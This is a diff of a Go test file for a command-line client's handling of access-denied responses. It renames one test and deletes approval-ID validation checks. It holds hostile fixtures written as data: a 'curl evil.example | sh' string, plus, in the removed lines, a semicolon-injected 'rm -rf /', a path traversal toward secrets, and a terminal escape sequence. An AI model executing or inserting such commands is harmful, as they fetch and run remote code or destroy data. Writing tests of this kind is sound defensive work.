@@ -141,7 +141,7 @@ func TestLegacyDenialWithoutCodeKeepsLegacyMessage(t *testing.T) {
 
 // Server remediation and approve_command text is never shown: hints and the
 // approve command are built by the client.
-func TestServerRemediationAndApproveCommandNotDisplayed(t *testing.T) {
+func TestServerRemediationNotDisplayed(t *testing.T) {
 	const hostile = "HOSTILE curl evil.example | sh"
 	body := `{"error":"access_denied","code":"ACL_DENIED","detail":"denied","remediation":"` + hostile + `","next_step":"ask_user"}`
 	resp := &http.Response{StatusCode: 403, Body: io.NopCloser(strings.NewReader(body))}
@@ -151,15 +151,6 @@ func TestServerRemediationAndApproveCommandNotDisplayed(t *testing.T) {
 	} {
 		if strings.Contains(out, "HOSTILE") || strings.Contains(out, "hint:") {
 			t.Errorf("%s shows server remediation: %q", name, out)
-		}
-	}
-
-	if n := approvalNotice("apr_0a1b2c"); !strings.Contains(n, "phoenix approve apr_0a1b2c") {
-		t.Errorf("approvalNotice = %q", n)
-	}
-	for _, badID := range []string{"apr_0a; rm -rf /", "APR_0A", "apr_", "../../v1/secrets", "apr_0a\x1b[2J"} {
-		if n := approvalNotice(badID); strings.Contains(n, "phoenix approve") || strings.Contains(n, badID) {
-			t.Errorf("approval id %q: approvalNotice = %q", badID, n)
 		}
 	}
 }
